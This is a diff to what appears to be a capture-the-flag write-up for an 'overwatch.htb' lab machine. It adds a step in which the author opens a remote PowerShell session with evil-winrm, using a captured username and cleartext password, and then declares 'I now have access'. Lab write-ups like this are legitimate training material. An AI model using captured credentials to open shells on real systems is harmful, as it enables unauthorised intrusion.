@@ -453,6 +453,19 @@ This user is apart of the remote managment users group which means i can get acc
 # Evil-Winrm access as `sqlmgmt`
 
 ```python
-
+evil-winrm -i s200401.overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'     
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents>
 ```
+
+I now have access
+
+
 
